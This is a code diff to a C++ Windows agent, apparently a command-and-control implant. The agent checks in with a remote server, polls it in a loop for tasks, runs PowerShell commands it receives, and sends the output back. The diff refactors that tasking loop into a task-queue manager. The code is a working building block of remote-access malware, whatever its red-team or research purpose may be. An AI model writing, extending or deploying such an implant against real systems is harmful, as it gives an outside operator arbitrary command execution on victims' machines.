@@ -2,6 +2,7 @@
 #include "Agent.h"
 #include "CommManager.h"
 #include "CheckinModels.h"
+#include "TaskQueueManager.h"
 #include <windows.h>
 #include <vector>
 
@@ -75,6 +76,7 @@ std::string Agent::GetUser() const
 int main(int argc, char *argv[])
 {
     std::vector<ResultRequest> taskResults;
+    TaskQueueManager taskManager;
     CommManager manager = CommManager();
 
     IntitalCheckinRequest dummyData = {
@@ -96,32 +98,29 @@ int main(int argc, char *argv[])
     // Call InitialCheckinRequest
     // Stores the callbackUUID
     manager.IntialCheckin(dummyData.StructToJson());
-    CheckinResponse response;
     Agent agent;
     agent.Init();
 
-    std::string rawJson;
     while (true)
     {
-        if (taskResults.empty())
+        if (!taskManager.HasPendingResult())
         {
-            rawJson = manager.Checkin();
+            taskManager.QueueTask(manager.Checkin());
         }
         else
         {
-            std::string taskResultJSON = taskResults.front().StructToJson();
-            rawJson = manager.Checkin(taskResultJSON);
+            std::string newTask = manager.Checkin(taskManager.GetTaskResult());
+            taskManager.QueueTask(newTask);
         }
 
-        if (!rawJson.empty())
+        if (taskManager.HasPendingTask())
         {
-            response = ParseCommand(rawJson);
-            switch (response.type)
+            CheckinResponse task = taskManager.GetNextTask();
+            switch (task.type)
             {
             case 1:
-                std::string result = agent.ExecutePowerShell(response.powerShellCommand.commandlet);
-                ResultRequest requestresult = { response.id, "Successful", result };
-                taskResults.push_back(requestresult);
+                std::string result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
+                taskManager.StoreTaskResult(task.id, true, result);
                 break;
             }
 
